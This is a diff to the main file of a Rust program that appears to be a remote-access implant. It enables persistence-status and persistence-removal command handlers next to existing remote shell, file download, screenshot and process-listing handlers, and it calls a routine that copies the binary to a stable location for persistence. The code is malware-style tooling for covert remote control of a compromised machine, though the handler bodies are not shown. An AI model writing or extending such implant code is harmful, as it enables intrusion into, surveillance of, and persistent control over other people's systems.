@@ -6,8 +6,7 @@ mod persistence;
 mod dispatcher;
 mod commands;
 
-// use commands::{..., persist_status, persist_remove};  // TODO T7: uncomment after Task 7
-use commands::{shell, file_list, file_download, screenshot, process_list};
+use commands::{shell, file_list, file_download, screenshot, process_list, persist_status, persist_remove};
 use oxide_shared::packet::Packet;
 use rand::Rng;
 use std::time::Duration;
@@ -26,8 +25,8 @@ async fn main() -> anyhow::Result<()> {
     dispatch.register("file_download", Box::new(file_download::FileDownloadHandler));
     dispatch.register("screenshot", Box::new(screenshot::ScreenshotHandler));
     dispatch.register("process_list", Box::new(process_list::ProcessListHandler));
-    // dispatch.register("persist_status", Box::new(persist_status::PersistStatusHandler));  // TODO T7
-    // dispatch.register("persist_remove", Box::new(persist_remove::PersistRemoveHandler));  // TODO T7
+    dispatch.register("persist_status", Box::new(persist_status::PersistStatusHandler));
+    dispatch.register("persist_remove", Box::new(persist_remove::PersistRemoveHandler));
 
     let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
         eprintln!("[!] copy_to_stable: {e}");
